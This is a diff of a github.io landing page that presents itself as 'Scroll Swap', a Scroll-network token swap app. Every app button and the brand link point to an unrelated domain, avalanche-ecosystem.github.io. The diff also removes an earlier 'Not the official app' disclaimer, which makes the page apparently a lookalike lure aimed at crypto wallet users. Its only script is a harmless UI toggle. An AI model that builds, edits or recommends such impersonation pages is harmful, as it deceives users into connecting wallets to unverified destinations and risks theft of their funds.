@@ -1,47 +1,117 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Scroll Swap - Open App</title><meta name="description" content="scroll swap opens a Scroll-network DEX route for wallet-based token trades, slippage review, and explorer verification before you sign.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://scroll-swap.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Scroll Swap - Open App"><meta property="og:description" content="scroll swap opens a Scroll-network DEX route for wallet-based token trades, slippage review, and explorer verification before you sign.">
-<meta property="og:url" content="https://scroll-swap.github.io/"><meta property="og:image" content="https://scroll-swap.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Scroll Swap - Open App"><meta name="twitter:description" content="scroll swap opens a Scroll-network DEX route for wallet-based token trades, slippage review, and explorer verification before you sign."><meta name="twitter:image" content="https://scroll-swap.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://scroll-swap.github.io/#website", "url": "https://scroll-swap.github.io/", "name": "Scroll Swap"}, {"@type": "WebPage", "@id": "https://scroll-swap.github.io/#webpage", "url": "https://scroll-swap.github.io/", "name": "Scroll Swap - Open App", "description": "scroll swap opens a Scroll-network DEX route for wallet-based token trades, slippage review, and explorer verification before you sign.", "inLanguage": "en", "isPartOf": {"@id": "https://scroll-swap.github.io/#website"}}, {"@type": "Organization", "@id": "https://scroll-swap.github.io/#org", "name": "Scroll Swap", "url": "https://scroll-swap.github.io/", "logo": "https://scroll-swap.github.io/og-cover.png", "sameAs": ["https://x.com/ZebraProtocol", "https://github.com/zebra-xyz", "https://defillama.com/protocol/zebra"]}, {"@type": "WebApplication", "@id": "https://scroll-swap.github.io/#app", "name": "Scroll Swap", "url": "https://scroll-swap.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "scroll swap opens a Scroll-network DEX route for wallet-based token trades, slippage review, and explorer verification before you sign.", "featureList": ["Scroll Mainnet", "Non-custodial", "Slippage controls"], "isPartOf": {"@id": "https://scroll-swap.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://scroll-swap.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is Scroll Swap?", "acceptedAnswer": {"@type": "Answer", "text": "Scroll Swap is the search intent for exchanging tokens on the Scroll network. In this folder, the app route points to Zebra, a decentralized exchange built for Scroll. Users connect an EVM wallet on Scroll, choose a token pair, review the quote, and sign the swap transaction."}}, {"@type": "Question", "name": "Is Scroll Swap the official Scroll bridge?", "acceptedAnswer": {"@type": "Answer", "text": "No. Scroll Swap is a DEX swap flow on Scroll, while the official Scroll bridge moves assets between Ethereum and Scroll. Users who need gas or assets on Scroll may bridge first, then swap after the funds arrive on the Scroll network."}}, {"@type": "Question", "name": "What gas token do I need for Scroll Swap?", "acceptedAnswer": {"@type": "Answer", "text": "Scroll uses ETH as its gas token. Even if you are swapping a stablecoin or another ERC-20 token, the wallet needs enough ETH on Scroll to pay for token approvals and the swap transaction. Without Scroll ETH, the trade cannot be submitted."}}, {"@type": "Question", "name": "Why is price impact high on Scroll Swap?", "acceptedAnswer": {"@type": "Answer", "text": "High price impact usually means the selected pool does not have enough liquidity for the trade size or the route is inefficient. Try a smaller amount, a more liquid pair, or compare another Scroll DEX. Always review minimum received before signing because the final output can differ from the headline price."}}, {"@type": "Question", "name": "How do I verify a Scroll Swap transaction?", "acceptedAnswer": {"@type": "Answer", "text": "Copy the transaction hash from your wallet or the app and open it on Scrollscan. Check status, token transfers, contract addresses, and gas used. A wallet balance may lag briefly, but the explorer is the authoritative record for whether the transaction succeeded or reverted."}}, {"@type": "Question", "name": "Can I swap any token on Scroll?", "acceptedAnswer": {"@type": "Answer", "text": "No. A token must exist on Scroll and have usable liquidity in the selected DEX or route. Anyone can create tokens with familiar symbols, so verify the contract address before trading. If a pair has no route or extreme price impact, the market may be too thin to trade safely."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Scroll Swap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Scroll Swap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Scroll Swap</h1>
-      <div class="bridge-widget" role="group" aria-label="Scroll Swap preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> · Scroll</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Scroll</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Scroll Swap ↗</a></div>
-      <p class="hero-note">Live preview — open the official Scroll Swap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Scroll Mainnet</span><span class="trust-chip">Non-custodial</span><span class="trust-chip">Slippage controls</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Scroll Swap?</h2><div class="capsule"><strong>Scroll Swap</strong> is an app-first route for exchanging tokens on Scroll through Zebra, a <a class="inline-link" href="https://www.investopedia.com/terms/d/decentralized-exchanges.asp" rel="noopener noreferrer">decentralized exchange</a> built on Scroll. Scroll is <a class="inline-link" href="https://ethereum.org/en/developers/docs/evm/" rel="noopener noreferrer">EVM-compatible</a>, so confirm network, token contracts, and transactions with <a href="https://scrollscan.com/">Scrollscan</a> before signing.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Scroll Swap at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Scroll <a class="inline-link" href="https://www.coingecko.com/learn/decentralized-exchanges-explained" rel="noopener noreferrer">decentralized exchange</a> route</b></div><div class="f"><small>Network</small><b>Scroll</b></div><div class="f"><small>Token</small><b>No native swap token required</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://academy.binance.com/en/glossary/non-custodial-wallet" rel="noopener noreferrer">Non-custodial wallet</a> swaps</b></div><div class="f"><small>App route</small><b>Zebra on Scroll</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Scroll Swap fees and slippage on Zebra</h2><div class="intent-a">Scroll Swap through Zebra can involve pool fees, <a class="inline-link" href="https://www.coingecko.com/learn/what-is-slippage-and-price-impact-in-crypto" rel="noopener noreferrer">price impact</a>, token approval gas, and Scroll network gas. The fee a user feels most is often not the pool fee alone but the difference between expected output and minimum received after slippage. Scroll gas is paid in ETH on Scroll, so users need enough ETH on the network before trading. For smaller or less liquid pairs, price impact can dominate. Review the route, minimum received, <a class="inline-link" href="https://academy.binance.com/en/articles/what-is-slippage-in-crypto-and-how-to-avoid-it" rel="noopener noreferrer">slippage tolerance</a>, and token contracts before signing the approval or swap.</div></div></section><section class="section"><div class="container"><h2>Scroll Swap supported tokens and liquidity</h2><div class="intent-a">Scroll Swap demand usually means exchanging assets on Scroll rather than bridging to Scroll. Zebra is a Scroll-focused DEX, so token availability depends on pools deployed on Scroll and the app's routing. Common pairs may involve ETH, <a class="inline-link" href="https://www.coindesk.com/learn/what-are-stablecoins/" rel="noopener noreferrer">stablecoins</a>, and ecosystem tokens, but symbols should always be checked against contract addresses. A token can exist on Scroll without having deep <a class="inline-link" href="https://messari.io/report/state-of-dexs-q1-2024" rel="noopener noreferrer">DEX liquidity</a>. For larger swaps, compare output, price impact, and whether splitting the trade or using another Scroll DEX gives a better result.</div></div></section><section class="section section-alt"><div class="container"><h2>Scroll Swap failed transaction</h2><div class="intent-a">A Scroll Swap transaction can fail because the wallet is on the wrong network, the account lacks ETH for gas, slippage is too tight, liquidity moved before execution, a token approval is missing, or the selected token contract is not the intended asset. A reverted transaction can still spend gas. Use the transaction hash on Scrollscan to confirm the status and logs. If the approval succeeded but the swap failed, the allowance may remain active, so review token approvals if you do not plan to retry.</div></div></section><section class="section"><div class="container"><h2>How to get ETH on Scroll before swapping</h2><div class="intent-a">To swap on Scroll, a wallet needs ETH on Scroll for gas. Users can <a class="inline-link" href="https://docs.scroll.io/en/developers/l1-and-l2-bridging/eth-and-erc20-token-bridge/" rel="noopener noreferrer">bridge ETH from Ethereum</a> through the official Scroll portal or use a supported <a class="inline-link" href="https://www.bankless.com/the-bankless-guide-to-scroll" rel="noopener noreferrer">third-party bridge</a> or exchange withdrawal if available. After bridging, confirm the wallet network is Scroll and verify the ETH balance before trading. If the wallet has only the token being sold and no Scroll ETH, the swap cannot execute because the approval and trade still require gas.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Scroll Swap</h2><ol class="steps"><li><b>Open the app</b><span>Use the button to enter Zebra&#x27;s trading interface from the verified destination.</span></li><li><b>Connect on Scroll</b><span>Connect an <a class="inline-link" href="https://ethereum.org/en/wallets/find-wallet/" rel="noopener noreferrer">EVM wallet</a> and confirm it is set to Scroll Mainnet before selecting assets.</span></li><li><b>Choose the pair</b><span>Pick the input and output tokens, then verify symbols against contract addresses when needed.</span></li><li><b>Review and confirm</b><span>Check price impact, <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener noreferrer">slippage</a>, minimum received, approvals, and the final wallet prompt.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Scroll Swap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Scroll Swap ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Zebra Scroll Swap vs other Scroll DEXs</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Zebra Scroll Swap</th><th>Alternative</th></tr></thead><tbody><tr><td>Primary fit</td><td>Scroll-native DEX trading through Zebra</td><td>Other Scroll DEXs may have different pools and incentives</td></tr><tr><td>Network</td><td>Scroll</td><td>Scroll, depending on the DEX</td></tr><tr><td>Quote quality</td><td>Depends on Zebra pool depth and route</td><td>Depends on each DEX&#x27;s <a class="inline-link" href="https://docs.uniswap.org/concepts/protocol/router" rel="noopener noreferrer">liquidity and routing</a></td></tr><tr><td>Best user</td><td>Users who want a focused Scroll DEX interface</td><td>Users comparing execution across multiple Scroll venues</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Scroll Swap FAQ</h2><div class="faq-list"><details open><summary><h3>What is Scroll Swap?</h3></summary><div>Scroll Swap is the search intent for exchanging tokens on the Scroll network. In this folder, the app route points to Zebra, a decentralized exchange built for Scroll. Users connect an EVM wallet on Scroll, choose a token pair, review the quote, and sign the swap transaction.</div></details><details><summary><h3>Is Scroll Swap the <a class="inline-link" href="https://eco.com/support/en/articles/10273712-what-is-scroll-ethereum-s-zk-evm-l2-explained" rel="noopener noreferrer">official Scroll bridge</a>?</h3></summary><div>No. Scroll Swap is a DEX swap flow on Scroll, while the official Scroll bridge moves assets between Ethereum and Scroll. Users who need gas or assets on Scroll may bridge first, then swap after the funds arrive on the Scroll network.</div></details><details><summary><h3>What <a class="inline-link" href="https://www.gemini.com/cryptopedia/gas-fees-crypto" rel="noopener noreferrer">gas token</a> do I need for Scroll Swap?</h3></summary><div>Scroll uses ETH as its gas token. Even if you are swapping a stablecoin or another ERC-20 token, the wallet needs enough ETH on Scroll to pay for token approvals and the swap transaction. Without Scroll ETH, the trade cannot be submitted.</div></details><details><summary><h3>Why is price impact high on Scroll Swap?</h3></summary><div>High price impact usually means the selected pool does not have enough liquidity for the trade size or the route is inefficient. Try a smaller amount, a more liquid pair, or compare another Scroll DEX. Always review minimum received before signing because the final output can differ from the headline price.</div></details><details><summary><h3>How do I verify a Scroll Swap transaction?</h3></summary><div>Copy the transaction hash from your wallet or the app and open it on Scrollscan. Check status, token transfers, contract addresses, and gas used. A wallet balance may lag briefly, but the explorer is the authoritative record for whether the transaction succeeded or reverted.</div></details><details><summary><h3>Can I swap any token on Scroll?</h3></summary><div>No. A token must exist on Scroll and have usable liquidity in the selected DEX or route. Anyone can create tokens with familiar symbols, so verify the contract address before trading. If a pair has no route or extreme price impact, the market may be too thin to trade safely.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app. Verify the destination domain before connecting a wallet; educational content, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Scroll Swap</title>
+  <meta name="description" content="Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.">
+  <link rel="canonical" href="https://scroll-swap.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F3EF">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Scroll Swap">
+  <meta property="og:description" content="Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.">
+  <meta property="og:url" content="https://scroll-swap.github.io/">
+  <meta property="og:image" content="https://scroll-swap.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Scroll Swap">
+  <meta name="twitter:description" content="Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.">
+  <link rel="icon" type="image/png" sizes="256x256" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://scroll-swap.github.io/#website",
+        "url": "https://scroll-swap.github.io/",
+        "name": "Scroll Swap",
+        "description": "Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://scroll-swap.github.io/#organization",
+        "name": "Scroll Swap",
+        "url": "https://scroll-swap.github.io/",
+        "logo": "https://scroll-swap.github.io/favicon.png"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://scroll-swap.github.io/#app",
+        "name": "Scroll Swap",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://scroll-swap.github.io/",
+        "description": "Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet."
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Scroll Swap home">
+      <img src="favicon.png" width="28" height="28" alt="">
+      <span>Scroll Swap</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://scrollscan.com/" target="_blank" rel="nofollow noopener noreferrer">Scrollscan</a>
+      <a href="https://www.coingecko.com/en/coins/scroll" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+      <a href="https://ethereum.org/layer-2/" target="_blank" rel="nofollow noopener noreferrer">Layer 2 guide</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <h1>Scroll Swap</h1>
+    <p class="sub"><strong>Scroll Swap</strong> swaps tokens on the Scroll zkEVM from your own wallet.</p>
+
+    <section class="swap-card" aria-label="Swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="usdc.png" width="32" height="32" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch swap direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="eth.png" width="32" height="32" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">Scroll Swap &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+      button.classList.toggle("is-swapped");
+    });
+  }());
+  </script>
+</body>
+</html>
